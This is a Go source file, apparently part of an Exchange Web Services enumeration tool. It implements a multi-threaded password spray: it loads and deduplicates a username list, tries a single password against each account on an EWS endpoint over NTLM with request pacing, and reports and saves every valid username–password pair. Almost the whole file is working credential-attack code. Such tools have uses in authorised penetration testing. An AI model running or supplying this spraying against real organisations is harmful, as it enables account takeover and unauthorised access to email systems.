package main

import (
	"fmt"
	"io"
	"sort"
	"strings"
	"sync"
	"sync/atomic"

	"ews_enum/internal/ews"
)

type duplicateUsername struct {
	Duplicate string
	Canonical string
}

func duplicateUsernameList(entries []duplicateUsername) []string {
	seen := make(map[string]string, len(entries))
	for _, entry := range entries {
		key := strings.ToLower(entry.Canonical)
		if _, exists := seen[key]; exists {
			continue
		}
		seen[key] = entry.Canonical
	}

	users := make([]string, 0, len(seen))
	for _, user := range seen {
		users = append(users, user)
	}
	sort.Slice(users, func(i, j int) bool {
		return strings.ToLower(users[i]) < strings.ToLower(users[j])
	})
	return users
}

func runSpray(cfg appConfig, stdout, stderr io.Writer) int {
	client := ews.NewClient(ews.ClientOpts{
		NTLM: cfg.NTLM, TimeoutSec: cfg.Timeout, MaxConns: cfg.Conns,
		DisableKeepAlive: cfg.NTLM, // NTLM binds auth to TCP connection; do not reuse across users.
	})

	return runSprayWithTester(cfg, stdout, stderr, func(username string) (ews.AuthResult, error) {
		return ews.TestAuth(client, cfg.URL, username, cfg.Pass)
	})
}

func dedupeUsernames(users []string) ([]string, []duplicateUsername) {
	seen := make(map[string]string, len(users))
	unique := make([]string, 0, len(users))
	duplicates := make([]duplicateUsername, 0)

	for _, user := range users {
		key := strings.ToLower(user)
		if canonical, exists := seen[key]; exists {
			duplicates = append(duplicates, duplicateUsername{
				Duplicate: user,
				Canonical: canonical,
			})
			continue
		}
		seen[key] = user
		unique = append(unique, user)
	}

	return unique, duplicates
}

func runSprayWithTester(cfg appConfig, stdout, stderr io.Writer, testAuth func(string) (ews.AuthResult, error)) int {
	users, err := readLines(cfg.UserFile)
	if err != nil {
		fmt.Fprintf(stderr, "[!] Cannot read userfile: %v\n", err)
		return 1
	}
	if len(users) == 0 {
		fmt.Fprintf(stderr, "[!] No usernames found in %s\n", cfg.UserFile)
		return 1
	}

	users, duplicateEntries := dedupeUsernames(users)
	duplicates := len(duplicateEntries)
	if len(users) == 0 {
		fmt.Fprintf(stderr, "[!] No unique usernames found in %s\n", cfg.UserFile)
		return 1
	}

	fmt.Fprintf(stderr, "[*] Password spray against %s\n", cfg.URL)
	fmt.Fprintf(stderr, "[*] Users: %d, workers: %d, connections: %d\n", len(users), cfg.Workers, cfg.Conns)
	if duplicates > 0 {
		fmt.Fprintf(stderr, "[!] Skipping %d duplicate usernames from %s after trim/lowercase normalization\n", duplicates, cfg.UserFile)
	}

	var stateMu sync.Mutex
	var outputMu sync.Mutex
	var validUsers []string
	var startedCount atomic.Int64
	var completedCount atomic.Int64
	var opErrorCount atomic.Int64
	totalUsers := int64(len(users))
	workCh := make(chan string, cfg.Workers*2)
	pacer := newRequestPacer(cfg.DelayMS)
	var wg sync.WaitGroup

	clearProgress := func() {
		fmt.Fprintf(stderr, "\r%-100s\r", "")
	}

	worker := func() {
		defer wg.Done()
		for username := range workCh {
			if !pacer.Wait(nil) {
				return
			}

			started := startedCount.Add(1)
			completed := completedCount.Load()
			running := started - completed
			stateMu.Lock()
			hits := len(validUsers)
			stateMu.Unlock()
			outputMu.Lock()
			fmt.Fprint(stderr, formatAttemptProgress(completed, totalUsers, running, username, hits))
			outputMu.Unlock()

			result, authErr := testAuth(username)
			switch result {
			case ews.AuthSuccess:
				stateMu.Lock()
				validUsers = append(validUsers, username)
				stateMu.Unlock()
				outputMu.Lock()
				clearProgress()
				fmt.Fprintf(stderr, "[+] VALID: %s\n", username)
				outputMu.Unlock()
			case ews.AuthError:
				opErrorCount.Add(1)
				outputMu.Lock()
				clearProgress()
				fmt.Fprintf(stderr, "[!] ERROR: %s — %v\n", username, authErr)
				outputMu.Unlock()
			}
			completedCount.Add(1)
		}
	}

	wg.Add(cfg.Workers)
	for i := 0; i < cfg.Workers; i++ {
		go worker()
	}

	for _, user := range users {
		workCh <- user
	}
	close(workCh)
	wg.Wait()

	stateMu.Lock()
	validCount := len(validUsers)
	stateMu.Unlock()

	outputMu.Lock()
	clearProgress()
	fmt.Fprintf(stderr, "[*] Spray complete: attempted %d, valid: %d\n", len(users), validCount)
	if count := opErrorCount.Load(); count > 0 {
		fmt.Fprintf(stderr, "[!] Spray encountered %d operational errors\n", count)
	}
		if duplicates := duplicateUsernameList(duplicateEntries); len(duplicates) > 0 {
			fmt.Fprintf(stderr, "[*] Duplicate usernames skipped (%d unique):\n", len(duplicates))
			for _, user := range duplicates {
				fmt.Fprintf(stderr, "    %s\n", user)
			}
		}
	outputMu.Unlock()

	if validCount == 0 {
		if opErrorCount.Load() > 0 {
			return 2
		}
		return 0
	}

	out, closeOut, err := openOutput(stdout, cfg.OutFile)
	if err != nil {
		fmt.Fprintf(stderr, "[!] Cannot create output file: %v\n", err)
		return 1
	}
	defer closeOut()

	if err := writeSprayResults(out, cfg.Format, cfg.Pass, validUsers); err != nil {
		fmt.Fprintf(stderr, "[!] Writing output failed: %v\n", err)
		return 1
	}

	if cfg.OutFile != "" {
		fmt.Fprintf(stderr, "[*] Results written to %s\n", cfg.OutFile)
	}

	if opErrorCount.Load() > 0 {
		return 2
	}

	return 0
}
